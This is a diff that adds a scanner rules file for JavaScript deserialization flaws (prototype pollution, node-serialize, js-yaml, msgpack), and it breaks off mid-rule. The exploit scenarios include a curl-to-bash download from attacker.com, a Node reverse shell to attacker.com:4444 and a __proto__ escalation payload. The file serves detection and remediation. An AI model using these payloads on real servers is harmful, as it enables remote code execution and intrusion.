@@ -1,0 +1,1612 @@
+rules:
+  # ============================================================================
+  # DESER-JS-001: JSON.parse Prototype Pollution
+  # ============================================================================
+  - rule_id: "DESER-JS-001"
+    title: "JSON.parse with User Input in Prototype-Pollution-Prone Context"
+    description: >
+      Detects usage of JSON.parse on user-controlled input where the resulting
+      object is merged, assigned, or spread into another object without proper
+      sanitization of __proto__, constructor, or prototype properties. This
+      pattern is the primary vector for prototype pollution attacks in Node.js
+      and browser JavaScript applications. An attacker can inject properties
+      such as __proto__.isAdmin to escalate privileges, override security
+      checks, or achieve remote code execution through polluted object chains.
+    language: javascript
+    category: deserialization
+    severity: High
+    confidence: 0.90
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - prototype-pollution
+      - json-parse
+      - user-input
+      - javascript
+      - node
+      - server-side
+    detection_layer: 2
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'JSON\.parse\s*\(\s*(req\.(body|query|params|headers))'
+        description: "JSON.parse called directly on Express request properties"
+      - type: regex
+        pattern: 'JSON\.parse\s*\(\s*(ctx\.(request\.body|query|params))'
+        description: "JSON.parse called directly on Koa context request properties"
+      - type: regex
+        pattern: 'JSON\.parse\s*\(\s*Buffer\.from\s*\('
+        description: "JSON.parse on Buffer.from conversion of potentially untrusted data"
+      - type: regex
+        pattern: 'Object\.assign\s*\([^)]*,\s*JSON\.parse\s*\('
+        description: "Object.assign merging parsed JSON into target object"
+      - type: regex
+        pattern: '(\.\.\.\s*JSON\.parse\s*\()'
+        description: "Spread operator on JSON.parse result into object literal"
+      - type: regex
+        pattern: '(merge|deepMerge|extend|defaults|defaultsDeep)\s*\([^)]*JSON\.parse'
+        description: "Deep merge utility applied to JSON.parse output"
+      - type: regex
+        pattern: '_\.merge\s*\([^)]*JSON\.parse\s*\('
+        description: "Lodash merge with JSON.parse result enabling prototype pollution"
+      - type: regex
+        pattern: 'JSON\.parse\s*\(\s*(event\.body|request\.body|payload|data|input|message)'
+        description: "JSON.parse on generic user-controlled variable names"
+    anti_patterns:
+      - 'JSON\.parse\s*\(\s*JSON\.stringify'
+      - 'JSON\.parse\s*\(\s*["\x27]\{'
+      - 'JSON\.parse\s*\(\s*fs\.readFileSync'
+      - 'JSON\.parse\s*\(\s*process\.env\.'
+      - 'JSON\.parse\s*\(\s*["\x27]\['
+      - 'sanitize.*JSON\.parse'
+      - 'JSON\.parse.*hasOwnProperty\s*\(\s*["\x27]__proto__'
+      - 'JSON\.parse\s*\(\s*config\.'
+      - 'JSON\.parse\s*\(\s*readFileSync'
+      - 'JSON\.parse\s*\(\s*packageJson'
+      - 'JSON\.parse\s*\(\s*manifest'
+      - 'JSON\.parse\s*\(\s*["\x27]null["\x27]'
+      - 'JSON\.parse\s*\(\s*["\x27]true["\x27]'
+      - 'const\s+\w+\s*=\s*JSON\.parse\s*\(\s*["\x27]'
+      - 'try\s*\{[^}]*JSON\.parse[^}]*\}\s*catch.*return\s+(null|undefined|false)'
+    bypass_variants:
+      - description: "Indirect JSON.parse via variable aliasing"
+        pattern: '(const|let|var)\s+\w+\s*=\s*JSON\[.parse.\]'
+      - description: "JSON.parse through dynamic property access"
+        pattern: 'JSON\[\s*["\x27]parse["\x27]\s*\]\s*\('
+      - description: "Prototype pollution via computed property name injection"
+        pattern: '\[\s*["\x27]__proto__["\x27]\s*\]|\[\s*["\x27]constructor["\x27]\s*\]\s*\[\s*["\x27]prototype["\x27]\s*\]'
+    evasion_indicators:
+      - "Variable aliasing of JSON.parse"
+      - "Dynamic property access on JSON object"
+      - "Encoded __proto__ string in user input"
+      - "Use of Reflect.apply to invoke parse"
+      - "Obfuscated constructor.prototype chain access"
+    encoding_variants:
+      - type: "unicode_escape"
+        pattern: '\\u005f\\u005fproto\\u005f\\u005f'
+      - type: "hex_escape"
+        pattern: '\\x5f\\x5fproto\\x5f\\x5f'
+      - type: "base64"
+        pattern: 'atob\s*\(\s*["\x27]X19wcm90b19f["\x27]\s*\)'
+    multi_function_chain_patterns:
+      - "JSON.parse -> Object.assign -> object usage in auth check"
+      - "JSON.parse -> lodash.merge -> configuration object"
+      - "JSON.parse -> spread into defaults -> template rendering"
+      - "req.body -> JSON.parse -> deepMerge -> session state"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Prototype pollution can override isAdmin or role properties on Object.prototype, granting universal privilege escalation"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "req.body / req.query / req.params"
+        sink: "Object.assign / lodash.merge / spread operator"
+        through: "JSON.parse"
+      - source: "WebSocket message"
+        sink: "Object property assignment"
+        through: "JSON.parse -> merge utility"
+      - source: "HTTP POST body"
+        sink: "Configuration object mutation"
+        through: "JSON.parse -> deepMerge"
+    impact: |
+      Prototype pollution via JSON.parse can lead to:
+      - Remote Code Execution through polluted child_process options
+      - Authentication bypass by injecting isAdmin or role properties
+      - Denial of Service by overriding toString/valueOf on Object.prototype
+      - Cross-Site Scripting via polluted template engine options
+      - Information disclosure through polluted logging configurations
+    remediation: |
+      1. Use Object.create(null) for dictionary-like objects:
+         ```javascript
+         const safe = Object.create(null);
+         Object.assign(safe, JSON.parse(userInput));
+         ```
+      2. Freeze Object.prototype in application bootstrap:
+         ```javascript
+         Object.freeze(Object.prototype);
+         ```
+      3. Validate and strip dangerous keys before merge:
+         ```javascript
+         function safeParse(input) {
+           const obj = JSON.parse(input);
+           delete obj.__proto__;
+           delete obj.constructor;
+           delete obj.prototype;
+           return obj;
+         }
+         ```
+      4. Use a safe merge library such as lodash >= 4.17.21 with whitelisted keys.
+      5. Implement JSON schema validation before processing parsed objects.
+    references:
+      - "https://cwe.mitre.org/data/definitions/502.html"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+      - "https://portswigger.net/web-security/prototype-pollution"
+      - "https://github.com/nicolo-ribaudo/tc39-proposal-realms"
+    context_awareness:
+      surrounding_context_patterns:
+        - "Object.assign call within 5 lines of JSON.parse"
+        - "Spread operator on parsed result"
+        - "lodash merge/extend/defaults within call chain"
+        - "No __proto__ key filtering before merge"
+      taint_source_indicators:
+        - "req.body"
+        - "req.query"
+        - "req.params"
+        - "event.body"
+        - "ctx.request.body"
+        - "message.data"
+      taint_sink_indicators:
+        - "Object.assign"
+        - "_.merge"
+        - "_.defaultsDeep"
+        - "spread operator in object literal"
+        - "for...in loop property copy"
+      sanitization_patterns:
+        - "Object.keys().filter(k => !k.startsWith('__'))"
+        - "JSON.parse(JSON.stringify(obj))"
+        - "hasOwnProperty check before property access"
+        - "Object.create(null) as target"
+    severity_scoring:
+      severity_weight: 8
+      risk_score_formula_hint: "severity_weight * confidence * (1 - sanitization_score)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        An attacker sends a POST request to an Express API endpoint with the
+        following JSON body:
+        {"__proto__": {"isAdmin": true, "role": "superuser"}}
+        The server parses this with JSON.parse and merges it into a user
+        configuration object using Object.assign. Because __proto__ is not
+        filtered, Object.prototype is polluted. All subsequent object
+        instances in the application now have isAdmin=true, bypassing
+        authorization checks in middleware.
+      example_payload: '{"__proto__": {"isAdmin": true, "role": "superuser"}}'
+      attacker_objective: "Achieve privilege escalation by polluting Object.prototype with authorization-relevant properties"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "DESER-JS-002"
+        - "DESER-JS-007"
+        - "DESER-JS-008"
+
+  # ============================================================================
+  # DESER-JS-002: node-serialize / funcster RCE
+  # ============================================================================
+  - rule_id: "DESER-JS-002"
+    title: "node-serialize or funcster Remote Code Execution via Deserialization"
+    description: >
+      Detects usage of the node-serialize or funcster libraries which support
+      serialization and deserialization of JavaScript functions. The
+      node-serialize library's unserialize function can execute arbitrary
+      JavaScript code when processing specially crafted input containing
+      Immediately Invoked Function Expressions (IIFE). The funcster library
+      similarly reconstructs functions from serialized strings. Both are
+      well-known vectors for remote code execution in Node.js applications.
+    language: javascript
+    category: deserialization
+    severity: Critical
+    confidence: 0.95
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - rce
+      - node-serialize
+      - funcster
+      - iife
+      - critical
+      - node
+    detection_layer: 1
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'require\s*\(\s*["\x27]node-serialize["\x27]\s*\)'
+        description: "Import of the vulnerable node-serialize package"
+      - type: regex
+        pattern: '\.unserialize\s*\(\s*(req\.|ctx\.|event\.|data|input|payload|body|message)'
+        description: "unserialize called on user-controlled input"
+      - type: regex
+        pattern: 'require\s*\(\s*["\x27]funcster["\x27]\s*\)'
+        description: "Import of the vulnerable funcster package"
+      - type: regex
+        pattern: 'funcster\.deepDeserialize\s*\('
+        description: "funcster deepDeserialize call"
+      - type: regex
+        pattern: 'serialize\.unserialize\s*\('
+        description: "Direct call to serialize.unserialize"
+      - type: regex
+        pattern: '_\$\$ND_FUNC\$\$_'
+        description: "node-serialize function marker in data indicating serialized function payload"
+      - type: regex
+        pattern: 'from\s+["\x27]node-serialize["\x27]'
+        description: "ES module import of node-serialize"
+      - type: regex
+        pattern: 'unserialize\s*\(\s*Buffer\.from\s*\('
+        description: "unserialize on buffer-converted input"
+    anti_patterns:
+      - 'unserialize\s*\(\s*["\x27]\{'
+      - 'unserialize\s*\(\s*JSON\.stringify'
+      - '\/\/\s*test'
+      - 'unserialize\s*\(\s*config\.'
+      - '\.unserialize\s*\(\s*fs\.'
+      - 'mock.*unserialize'
+      - 'jest\.mock.*node-serialize'
+      - 'unserialize\s*\(\s*serialize\s*\('
+      - 'unserialize\s*\(\s*cache\.'
+      - 'unserialize\s*\(\s*internal'
+      - '\/\/\s*deprecated'
+      - 'unserialize\s*\(\s*trusted'
+      - 'unserialize\s*\(\s*signed'
+      - '\/\*\s*safe\s*\*\/'
+      - 'unserialize\s*\(\s*verified'
+    bypass_variants:
+      - description: "IIFE payload inside serialized function string"
+        pattern: '_\$\$ND_FUNC\$\$_function\s*\(\s*\)\s*\{.*\}\s*\(\s*\)'
+      - description: "Dynamic require of node-serialize to evade static analysis"
+        pattern: 'require\s*\(\s*["\x27]node-["\x27]\s*\+\s*["\x27]serialize["\x27]\s*\)'
+      - description: "Aliased import to hide library usage"
+        pattern: '(const|let|var)\s+\w+\s*=\s*require\s*\(\s*["\x27]node-serialize["\x27]\s*\)\s*;\s*\w+\.unserialize'
+    evasion_indicators:
+      - "Dynamic require with string concatenation for module name"
+      - "Base64-encoded serialized payload"
+      - "IIFE wrapped in serialized function marker"
+      - "Aliased module import name"
+      - "Hex-encoded function body"
+    encoding_variants:
+      - type: "base64"
+        pattern: 'Buffer\.from\s*\([^)]+,\s*["\x27]base64["\x27]\s*\)\.toString\s*\(\s*\).*unserialize'
+      - type: "hex"
+        pattern: 'Buffer\.from\s*\([^)]+,\s*["\x27]hex["\x27]\s*\)\.toString\s*\(\s*\).*unserialize'
+      - type: "url_encoding"
+        pattern: 'decodeURIComponent\s*\([^)]+\).*unserialize'
+    multi_function_chain_patterns:
+      - "req.body -> base64 decode -> unserialize -> code execution"
+      - "cookie value -> parse -> unserialize -> RCE"
+      - "WebSocket data -> Buffer.from -> unserialize -> child_process"
+      - "HTTP header -> decode -> unserialize -> eval chain"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Direct remote code execution on the server with the privileges of the Node.js process"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "req.body / req.cookies"
+        sink: "serialize.unserialize"
+        through: "Direct parameter passing or base64 decoding"
+      - source: "WebSocket message"
+        sink: "serialize.unserialize"
+        through: "JSON.parse -> property extraction -> unserialize"
+      - source: "Redis / message queue payload"
+        sink: "funcster.deepDeserialize"
+        through: "Queue consumer callback"
+    impact: |
+      Exploitation of node-serialize or funcster deserialization leads to:
+      - Full Remote Code Execution on the server
+      - Arbitrary file read/write via fs module access
+      - Reverse shell establishment
+      - Lateral movement within the infrastructure
+      - Complete system compromise
+      - Data exfiltration of all accessible databases and files
+    remediation: |
+      1. Remove node-serialize and funcster from dependencies entirely:
+         ```bash
+         npm uninstall node-serialize funcster
+         ```
+      2. Replace with safe serialization libraries:
+         ```javascript
+         // Use JSON for data serialization
+         const data = JSON.parse(input);
+         // Or use a schema-validated approach
+         const Ajv = require('ajv');
+         const ajv = new Ajv();
+         const validate = ajv.compile(schema);
+         ```
+      3. Never deserialize functions from untrusted input.
+      4. Implement Content Security Policy and input validation.
+      5. Use process sandboxing (vm2 or isolated-vm) if dynamic code execution is required.
+    references:
+      - "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941"
+      - "https://blog.websecurify.com/2017/02/hacking-node-serialize"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+      - "https://cwe.mitre.org/data/definitions/502.html"
+    context_awareness:
+      surrounding_context_patterns:
+        - "require('node-serialize') in same file"
+        - "Cookie parsing before unserialize call"
+        - "Base64 decode before unserialize"
+        - "No input validation before unserialize"
+      taint_source_indicators:
+        - "req.cookies"
+        - "req.body"
+        - "req.headers"
+        - "WebSocket message"
+        - "event.body"
+        - "process.stdin"
+      taint_sink_indicators:
+        - "serialize.unserialize"
+        - "funcster.deepDeserialize"
+        - "funcster.unserialize"
+        - "eval"
+        - "Function constructor"
+      sanitization_patterns:
+        - "Input schema validation before deserialization"
+        - "Type checking before unserialize"
+        - "Whitelist-based property filtering"
+        - "HMAC signature verification of serialized data"
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * exploitability_factor"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        An Express application uses node-serialize to deserialize session data
+        stored in a cookie. An attacker crafts a cookie containing a
+        node-serialize payload with an IIFE that spawns a reverse shell:
+        {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl
+        attacker.com/shell|bash')}()"}
+        When the server calls serialize.unserialize(req.cookies.session), the
+        function is reconstructed and immediately invoked, executing the
+        reverse shell command on the server.
+      example_payload: '{"rce":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id > /tmp/pwned\")}()"}'
+      attacker_objective: "Achieve remote code execution on the Node.js server to establish persistent access"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules:
+        - "DESER-JS-001"
+        - "DESER-JS-003"
+        - "DESER-JS-007"
+
+  # ============================================================================
+  # DESER-JS-003: js-yaml Unsafe Load
+  # ============================================================================
+  - rule_id: "DESER-JS-003"
+    title: "js-yaml Unsafe Load Enabling Arbitrary Code Execution"
+    description: >
+      Detects usage of js-yaml's unsafe load functions (yaml.load without
+      specifying a safe schema, yaml.loadAll, or the deprecated
+      yaml.safeLoad being bypassed). Prior to js-yaml v4, yaml.load()
+      defaulted to DEFAULT_FULL_SCHEMA which supports JavaScript-specific
+      types including !!js/function, !!js/regexp, and !!js/undefined.
+      An attacker can exploit this to execute arbitrary JavaScript code
+      via crafted YAML payloads containing !!js/function tags.
+    language: javascript
+    category: deserialization
+    severity: Critical
+    confidence: 0.92
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - yaml
+      - js-yaml
+      - rce
+      - unsafe-load
+      - code-execution
+      - node
+    detection_layer: 2
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'yaml\.load\s*\(\s*(req\.|ctx\.|event\.|data|input|payload|body|content|text|raw)'
+        description: "yaml.load called with user-controlled input"
+      - type: regex
+        pattern: 'yaml\.load\s*\([^)]*\)\s*(?!.*schema\s*:\s*(SAFE_SCHEMA|JSON_SCHEMA|FAILSAFE_SCHEMA))'
+        description: "yaml.load without explicit safe schema specification"
+      - type: regex
+        pattern: 'yaml\.loadAll\s*\('
+        description: "yaml.loadAll processes multiple documents and may be unsafe"
+      - type: regex
+        pattern: 'yaml\.load\s*\([^)]*,\s*\{\s*schema\s*:\s*yaml\.DEFAULT_FULL_SCHEMA'
+        description: "Explicit use of DEFAULT_FULL_SCHEMA enabling JS type execution"
+      - type: regex
+        pattern: 'require\s*\(\s*["\x27]js-yaml["\x27]\s*\).*\.load\s*\('
+        description: "js-yaml require followed by load call in same context"
+      - type: regex
+        pattern: 'yaml\.Type\s*\(\s*["\x27]!!js/function["\x27]'
+        description: "Custom YAML type definition for JavaScript functions"
+      - type: regex
+        pattern: 'yaml\.load\s*\(\s*fs\.readFileSync\s*\([^)]*req\.'
+        description: "yaml.load on file path controlled by user input"
+      - type: regex
+        pattern: 'yaml\.load\s*\(\s*await\s+(fetch|axios|got|request)\s*\('
+        description: "yaml.load on data fetched from external sources"
+    anti_patterns:
+      - 'yaml\.load\s*\([^)]*,\s*\{\s*schema\s*:\s*yaml\.SAFE_SCHEMA'
+      - 'yaml\.load\s*\([^)]*,\s*\{\s*schema\s*:\s*yaml\.JSON_SCHEMA'
+      - 'yaml\.load\s*\([^)]*,\s*\{\s*schema\s*:\s*yaml\.FAILSAFE_SCHEMA'
+      - 'yaml\.safeLoad\s*\('
+      - 'yaml\.load\s*\(\s*["\x27]'
+      - 'yaml\.load\s*\(\s*`[^$]'
+      - 'yaml\.load\s*\(\s*fs\.readFileSync\s*\(\s*path\.join\s*\(\s*__dirname'
+      - 'yaml\.load\s*\(\s*fs\.readFileSync\s*\(\s*["\x27]\./'
+      - '\/\/\s*eslint-disable.*security'
+      - 'yaml\.load\s*\(\s*config'
+      - 'yaml\.load\s*\(\s*template'
+      - 'yaml\.load\s*\(\s*default'
+      - 'yaml\.load\s*\(\s*fixture'
+      - 'yaml\.load\s*\(\s*mock'
+      - 'yaml\.load\s*\(\s*sample'
+    bypass_variants:
+      - description: "Using DEFAULT_FULL_SCHEMA to explicitly enable JS types"
+        pattern: 'schema\s*:\s*yaml\.(DEFAULT_FULL_SCHEMA|FULL_SCHEMA)'
+      - description: "Constructing a custom schema that includes JS types"
+        pattern: 'yaml\.Schema\.create\s*\([^)]*yaml\.DEFAULT_FULL_SCHEMA'
+      - description: "Using loadAll to process multiple potentially malicious documents"
+        pattern: 'yaml\.loadAll\s*\(\s*(req\.|ctx\.|data|input|body)'
+    evasion_indicators:
+      - "Using js-yaml version < 4.0 where load is unsafe by default"
+      - "Dynamic schema assignment from configuration"
+      - "Custom type constructors that permit function instantiation"
+      - "Encoded YAML payloads decoded before loading"
+    encoding_variants:
+      - type: "base64_yaml"
+        pattern: 'yaml\.load\s*\(\s*Buffer\.from\s*\([^)]+,\s*["\x27]base64["\x27]\s*\)'
+      - type: "url_encoded"
+        pattern: 'yaml\.load\s*\(\s*decodeURIComponent\s*\('
+      - type: "multipart"
+        pattern: 'yaml\.load\s*\(\s*file\.(buffer|content|data)'
+    multi_function_chain_patterns:
+      - "file upload -> read file content -> yaml.load -> config merge"
+      - "API endpoint -> req.body -> yaml.load -> database insert"
+      - "webhook -> payload -> yaml.load -> event processing"
+      - "CI config -> yaml.load -> build command execution"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "YAML deserialization with !!js/function tag executes arbitrary code in the Node.js process context"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "req.body / file upload content"
+        sink: "yaml.load"
+        through: "Direct parameter passing"
+      - source: "External URL fetch response"
+        sink: "yaml.load"
+        through: "HTTP client response body"
+      - source: "Message queue payload"
+        sink: "yaml.loadAll"
+        through: "Consumer callback data parameter"
+    impact: |
+      Unsafe YAML deserialization in js-yaml can result in:
+      - Remote Code Execution via !!js/function tags
+      - Server-Side Request Forgery via crafted YAML types
+      - Denial of Service through resource-intensive YAML constructs (billion laughs)
+      - Information disclosure through !!js/regexp and error-based side channels
+      - Full server compromise with access to all Node.js APIs
+    remediation: |
+      1. Upgrade to js-yaml v4+ where load() uses SAFE_SCHEMA by default:
+         ```bash
+         npm install js-yaml@latest
+         ```
+      2. Always specify a safe schema explicitly:
+         ```javascript
+         const yaml = require('js-yaml');
+         const data = yaml.load(input, { schema: yaml.JSON_SCHEMA });
+         ```
+      3. Use yaml.safeLoad (pre-v4) or validate YAML structure after loading:
+         ```javascript
+         const data = yaml.load(input, { schema: yaml.FAILSAFE_SCHEMA });
+         ```
+      4. Implement input size limits to prevent billion-laughs DoS.
+      5. Validate loaded data against a JSON Schema before processing.
+    references:
+      - "https://github.com/nodeca/js-yaml/issues/480"
+      - "https://cwe.mitre.org/data/definitions/502.html"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+      - "https://snyk.io/vuln/npm:js-yaml"
+    context_awareness:
+      surrounding_context_patterns:
+        - "js-yaml import in same file"
+        - "No schema parameter in load options"
+        - "User-controlled input flows into yaml.load"
+        - "File upload handling before yaml.load"
+      taint_source_indicators:
+        - "req.body"
+        - "req.file.buffer"
+        - "uploaded file content"
+        - "external fetch response"
+        - "webhook payload"
+        - "form data field"
+      taint_sink_indicators:
+        - "yaml.load"
+        - "yaml.loadAll"
+        - "YAML.parse"
+        - "yaml.safeLoad with overridden schema"
+      sanitization_patterns:
+        - "schema: yaml.SAFE_SCHEMA"
+        - "schema: yaml.JSON_SCHEMA"
+        - "schema: yaml.FAILSAFE_SCHEMA"
+        - "yaml.safeLoad usage"
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (1 - safe_schema_present)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A configuration management API accepts YAML input from authenticated
+        users to define deployment settings. The endpoint uses yaml.load()
+        without specifying a safe schema. An attacker submits YAML containing:
+        !!js/function "function(){var net=require('net'),cp=require('child_process'),
+        sh=cp.spawn('/bin/sh',[]);var client=new net.Socket();client.connect(4444,
+        'attacker.com',function(){client.pipe(sh.stdin);sh.stdout.pipe(client);})}()"
+        This establishes a reverse shell from the server to the attacker.
+      example_payload: "!!js/function >-\n  function(){require('child_process').execSync('id');}()"
+      attacker_objective: "Execute arbitrary code on the server via YAML deserialization to establish persistent backdoor access"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "DESER-JS-001"
+        - "DESER-JS-002"
+        - "DESER-PY-002"
+
+  # ============================================================================
+  # DESER-JS-004: msgpack Unpack Untrusted Data
+  # ============================================================================
+  - rule_id: "DESER-JS-004"
+    title: "MessagePack Unpack of Untrusted Data Leading to Object Injection"
+    description: >
+      Detects usage of MessagePack (msgpack, msgpack-lite, @msgpack/msgpack)
+      deserialization functions on untrusted input. While MessagePack itself
+      is a binary serialization format, many JavaScript implementations
+      support custom extension types and codec configurations that can
+      reconstruct complex object graphs. Processing attacker-controlled
+      MessagePack data can lead to object injection, type confusion, and
+      in some cases code execution through custom extension handlers.
+    language: javascript
+    category: deserialization
+    severity: High
+    confidence: 0.85
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - msgpack
+      - messagepack
+      - binary-format
+      - type-confusion
+      - object-injection
+      - node
+    detection_layer: 2
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'msgpack\.(unpack|decode)\s*\(\s*(req\.|ctx\.|event\.|data|input|payload|body|buffer|message)'
+        description: "msgpack unpack/decode called on user-controlled input"
+      - type: regex
+        pattern: 'require\s*\(\s*["\x27](msgpack|msgpack-lite|@msgpack\/msgpack|msgpack5)["\x27]\s*\)'
+        description: "Import of msgpack library"
+      - type: regex
+        pattern: 'decode\s*\(\s*new\s+Uint8Array\s*\(\s*(req\.|ctx\.|data|buffer|payload)'
+        description: "msgpack decode on Uint8Array from untrusted source"
+      - type: regex
+        pattern: 'msgpack\.createCodec\s*\(\s*\{[^}]*allowExtType\s*:\s*true'
+        description: "Custom codec with extension types enabled"
+      - type: regex
+        pattern: 'Decoder\s*\(\s*\{[^}]*extensionCodec'
+        description: "Custom extension codec in Decoder configuration"
+      - type: regex
+        pattern: 'unpackMulti\s*\(\s*(req\.|data|body|buffer|payload)'
+        description: "unpackMulti on user-controlled data allowing multiple object injection"
+    anti_patterns:
+      - 'msgpack\.(unpack|decode)\s*\(\s*msgpack\.(pack|encode)'
+      - 'msgpack\.(unpack|decode)\s*\(\s*internal'
+      - 'msgpack\.(unpack|decode)\s*\(\s*cache\.'
+      - 'msgpack\.(unpack|decode)\s*\(\s*config\.'
+      - '\/\/\s*test'
+      - 'mock.*msgpack'
+      - 'msgpack\.(unpack|decode)\s*\(\s*signed'
+      - 'msgpack\.(unpack|decode)\s*\(\s*encrypted'
+      - 'msgpack\.(unpack|decode)\s*\(\s*verified'
+      - 'msgpack\.(unpack|decode)\s*\(\s*trusted'
+      - 'hmac\.verify.*msgpack'
+      - 'msgpack\.(unpack|decode)\s*\(\s*fixture'
+      - 'msgpack\.(unpack|decode)\s*\(\s*sample'
+    bypass_variants:
+      - description: "Custom extension type handler executing code"
+        pattern: 'extensionCodec\.register\s*\(\s*\{[^}]*decode\s*:\s*function'
+      - description: "Dynamic codec assignment from user-controlled config"
+        pattern: 'createCodec\s*\(\s*(req\.|config\[|options\[)'
+      - description: "Aliased unpack function to avoid static detection"
+        pattern: '(const|let|var)\s+\w+\s*=\s*msgpack\.(unpack|decode)\s*;'
+    evasion_indicators:
+      - "Custom extension type handlers with eval or Function constructor"
+      - "Dynamic codec configuration from external source"
+      - "Base64 encoded msgpack payload"
+      - "Aliased decode function reference"
+      - "Multi-stream msgpack processing"
+    encoding_variants:
+      - type: "base64"
+        pattern: 'msgpack\.decode\s*\(\s*Buffer\.from\s*\([^)]+,\s*["\x27]base64["\x27]\s*\)'
+      - type: "hex"
+        pattern: 'msgpack\.decode\s*\(\s*Buffer\.from\s*\([^)]+,\s*["\x27]hex["\x27]\s*\)'
+      - type: "arraybuffer"
+        pattern: 'msgpack\.decode\s*\(\s*new\s+Uint8Array\s*\(\s*arrayBuffer\s*\)'
+    multi_function_chain_patterns:
+      - "WebSocket binaryMessage -> msgpack.decode -> database operation"
+      - "gRPC stream -> Buffer -> msgpack.unpack -> service handler"
+      - "MQTT message -> msgpack.decode -> IoT device command"
+      - "Redis subscription -> msgpack.unpack -> state mutation"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Object injection via crafted msgpack payloads can override security-relevant properties or trigger type confusion in downstream processing"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "WebSocket binary message"
+        sink: "msgpack.unpack / msgpack.decode"
+        through: "Binary message handler"
+      - source: "HTTP request body (application/x-msgpack)"
+        sink: "msgpack.decode"
+        through: "Custom body parser middleware"
+      - source: "Redis pub/sub message"
+        sink: "msgpack.unpack"
+        through: "Subscriber callback"
+    impact: |
+      Unsafe MessagePack deserialization can lead to:
+      - Object injection with attacker-controlled properties and types
+      - Type confusion causing logic errors in downstream processing
+      - Denial of Service through deeply nested or recursive structures
+      - Code execution via custom extension type handlers
+      - Memory corruption through crafted binary payloads
+    remediation: |
+      1. Validate msgpack output against a strict schema:
+         ```javascript
+         const { decode } = require('@msgpack/msgpack');
+         const Ajv = require('ajv');
+         const ajv = new Ajv();
+         const validate = ajv.compile(expectedSchema);
+         const data = decode(buffer);
+         if (!validate(data)) {
+           throw new Error('Invalid msgpack data structure');
+         }
+         ```
+      2. Disable custom extension types when processing untrusted data:
+         ```javascript
+         const decoder = new Decoder({ extensionCodec: undefined });
+         ```
+      3. Implement size limits on incoming binary payloads.
+      4. Use HMAC signatures to verify msgpack payload integrity before deserialization.
+      5. Prefer JSON for external API communication where full type fidelity is not required.
+    references:
+      - "https://cwe.mitre.org/data/definitions/502.html"
+      - "https://github.com/msgpack/msgpack-javascript"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+    context_awareness:
+      surrounding_context_patterns:
+        - "msgpack import in same file"
+        - "Binary WebSocket handler"
+        - "Custom content-type parser for msgpack"
+        - "No schema validation after unpack"
+      taint_source_indicators:
+        - "WebSocket binary data"
+        - "req.body (binary)"
+        - "MQTT message payload"
+        - "gRPC stream data"
+        - "Redis message"
+      taint_sink_indicators:
+        - "msgpack.unpack"
+        - "msgpack.decode"
+        - "Decoder.decode"
+        - "unpackMulti"
+      sanitization_patterns:
+        - "Schema validation after decode"
+        - "Type checking on decoded result"
+        - "HMAC verification before decode"
+        - "Size limit enforcement on buffer"
+    severity_scoring:
+      severity_weight: 8
+      risk_score_formula_hint: "severity_weight * confidence * (extension_types_enabled ? 1.2 : 0.8)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
